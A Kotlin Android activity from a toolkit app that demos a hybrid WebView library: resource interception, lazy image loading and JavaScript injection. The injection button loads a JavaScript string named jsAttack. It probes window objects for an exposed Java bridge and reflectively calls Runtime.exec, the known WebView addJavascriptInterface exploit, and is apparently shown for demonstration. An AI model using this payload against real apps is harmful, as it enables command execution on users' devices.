package com.jiangkang.ktools.web

import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import com.jiangkang.hybrid.Khybrid
import com.jiangkang.ktools.R
import com.jiangkang.tools.utils.ToastUtils
import kotlinx.android.synthetic.main.activity_hybrid.*

class HybridActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_hybrid)
        handleClick()
    }

    private fun handleClick() {

        btnResourceInterceptor.setOnClickListener {
            Khybrid()
                    .isInterceptResources(true)
                    .loadUrl(this, "http://image.baidu.com/search/index?tn=baiduimage&ps=1&ct=201326592&lm=-1&cl=2&nc=1&ie=utf-8&word=%E5%A4%A9%E6%B4%A5%E5%A4%A7%E5%AD%A6")
        }

        btnImgLazyLoading.setOnClickListener {
            Khybrid()
                    .isLoadImgLazy(true)
                    .loadUrl(this, "https://movie.douban.com/subject/2210031/all_photos")
        }

//        btnCertificateVerify.setOnClickListener {
//            ToastUtils.showShortToast("待开发")
//        }
//
//        btnGeoRequest.setOnClickListener {
//            ToastUtils.showShortToast("待开发")
//        }
//
//        btnPageCache.setOnClickListener {
//            ToastUtils.showShortToast("待开发")
//        }

        btnJsInject.setOnClickListener {
//            val jsString = """
//            (function(){
//                document.body.style.backgroundColor = "rgba(0,0,0,125)"
//            })();
//                """


            val jsAttack = """
                (function(){
                    for (var obj in window) {
                        if ("getClass" in window[obj]) {
                             alert(obj);
                            return  window[obj].getClass().forName("java.lang.Runtime")
                                     .getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
                        }
                    }
                })();
                """

//            Khybrid()
//                    .injectJs(jsString)
//                    .loadUrl(this, "https://github.com/jiangkang/KTools")

            Khybrid()
                    .injectJs(jsAttack)
                    .loadUrl(this, "https://github.com/jiangkang/KTools")

        }


    }
}
